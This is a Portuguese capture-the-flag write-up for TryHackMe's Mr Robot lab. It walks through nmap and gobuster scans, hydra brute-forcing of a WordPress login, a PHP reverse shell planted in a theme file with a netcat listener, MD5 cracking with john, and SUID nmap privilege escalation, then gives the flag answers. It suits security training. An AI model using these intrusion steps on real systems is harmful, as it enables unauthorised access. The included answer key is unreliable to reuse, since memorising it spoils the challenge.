# Relatório da sala - [Mr Robot](https://tryhackme.com/r/room/mrrobot)
##  IP DO ALVO: 10.10.165.155
Resultado nmap:
Comando utilizado: nmap -sV -sC -oA scans/initial 10.10.165.155
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-15 13:57 EDT
Stats: 0:00:24 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Nmap scan report for 10.10.165.155
Host is up (0.24s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
443/tcp open   ssl/http Apache httpd
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
```
Utilizando Gobuster, foi possível realizar um brute force de diretórios web no site que estamos atacando.
Comando utilizado: ```gobuster dir -u http://10.10.165.155 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 100 -q -o gobuster.txt```
```
Diretórios encontrados:
/images               (Status: 301) [Size: 236] [--> http://10.10.165.155/images/]
/blog                 (Status: 301) [Size: 234] [--> http://10.10.165.155/blog/]
/sitemap              (Status: 200) [Size: 0]
/video                (Status: 301) [Size: 235] [--> http://10.10.165.155/video/]
/login                (Status: 302) [Size: 0] [--> http://10.10.165.155/wp-login.php]
/rss                  (Status: 301) [Size: 0] [--> http://10.10.165.155/feed/]
/0                    (Status: 301) [Size: 0] [--> http://10.10.165.155/0/]
/feed                 (Status: 301) [Size: 0] [--> http://10.10.165.155/feed/]
/wp-content           (Status: 301) [Size: 240] [--> http://10.10.165.155/wp-content/]
/atom                 (Status: 301) [Size: 0] [--> http://10.10.165.155/feed/atom/]
/image                (Status: 301) [Size: 0] [--> http://10.10.165.155/image/]
/admin                (Status: 301) [Size: 235] [--> http://10.10.165.155/admin/]
/audio                (Status: 301) [Size: 235] [--> http://10.10.165.155/audio/]
/intro                (Status: 200) [Size: 516314]
/css                  (Status: 301) [Size: 233] [--> http://10.10.165.155/css/]
/wp-login             (Status: 200) [Size: 2613]
/rss2                 (Status: 301) [Size: 0] [--> http://10.10.165.155/feed/]
/license              (Status: 200) [Size: 309]
/wp-includes          (Status: 301) [Size: 241] [--> http://10.10.165.155/wp-includes/]
/js                   (Status: 301) [Size: 232] [--> http://10.10.165.155/js/]
/Image                (Status: 301) [Size: 0] [--> http://10.10.165.155/Image/]
/rdf                  (Status: 301) [Size: 0] [--> http://10.10.165.155/feed/rdf/]
/page1                (Status: 301) [Size: 0] [--> http://10.10.165.155/]
/readme               (Status: 200) [Size: 64]
/robots               (Status: 200) [Size: 41]
/dashboard            (Status: 302) [Size: 0] [--> http://10.10.165.155/wp-admin/]
/%20                  (Status: 301) [Size: 0] [--> http://10.10.165.155/]
/wp-admin             (Status: 301) [Size: 238] [--> http://10.10.165.155/wp-admin/]
/0000                 (Status: 301) [Size: 0] [--> http://10.10.165.155/0000/]
 ```
Acessando o diretório do Robots.txt, encontramos dois arquivos no qual não eram para ser indexados ao procurar eles no google. Primeiro arquivo: key.1-of-3.txt, contendo a primeira flag do desafio, e o arquivo fsocity.dic, contendo várias palvras aleatórias.


Acessando o diretório /wp-login.php, acessamos uma página de login do Wordpress, então, utilizei a ferramenta Hydra para realizar um ataque de bruteforce para ver se era possível capturar alguma informação utilizando o arquivo fsocity.dic que foi disponobilizado pelo site.
 
Comando utilizado: ```hydra -L fsocity.dic -p test 10.10.165.155 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username" -t 30```
Com esse comando, o nome de usuário: Elliot, foi encontrado
 
Reutilizando o comando da ferramenta Hydra, porém deixando o nome de usuário Elliot como um dado salvo e adicionando o arquivo .dic para dar um brute force nas senhas, descobri a senha de usuário:
```[80][http-post-form] host: 10.10.165.155   login: Elliot   password: ER28-0652```
 
Com este usuário e senha do WP, podemos realizar um reverse shell.
Comando utilizado para abrir um nc:```rlwrap nc -lvnp 53```
 
Modifiquei o tema do wordpress na pasta Twenty Fifteen: Archives (archive.php) e coloquei um reverse shell que eu encontrei no github do autor pentestmonkey https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-she>
Após colar isso e modificar o tema, entrei na aba http://10.10.165.155/wp-content/themes/twentyfifteen/archive.php e consegui acesso do sistema.
 
Acessando a máquina e indo no diretório /home/robot/ foi encontrada a segunda key do desafio, porém ela não pode ser lida sem ter previlégios, mas outro arquivo suspeito está no mesmo diretório, que é o password-raw.md5, contendo uma s>
 
Utilizando a ferramenta john, realizei um cracker de password em md5 e encontrei a senha = abcdefghijklmnopqrstuvwxyz
Comando utilizado: ```john md5.hash --wordlist=fsocity.dic --format=RAW-MD5```
Com essa senha, temos como realizar o login de root no sistema.
Segunda flag do desafio encontrada na pasta /robot
 
Para achar a última flag, primeiramente utilizei o python para deixar um terminal completo para mim: ```python -c 'import pty;pty.spawn("/bin/bash")'```
Após isso, fiz uma escalação de previlégios nos arquivos que apresentam o bit suid na máquina, utilizando o comando: ```find / -perm +6000 2>/dev/null | grep '/bin'```
Pode notar que o nmap está instalado na máquina, no qual apresenta bit SUID instalado, com isso, descobri que o nmap apresenta um modo interativo utilizando:
nmap --interactive. Acessei o site https://gtfobins.github.io/gtfobins/nmap/#shell e coloquei o comando nmap> !sh para conseguir interagir com o terminal, dentro dele, uma pasta /root é mostrada, e dentro dela, está nossa última flag do desafio.

<details>⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
<summary>Respostas do desafio</summary>

1.  **flag {073403c8a58a1f80d943455fb30724b9}**
2.  **flag {822c73956184f694993bede3eb39f959}**
3.  **flag {04787ddef27c3dee1ee161b21670b4e4}**
</details>

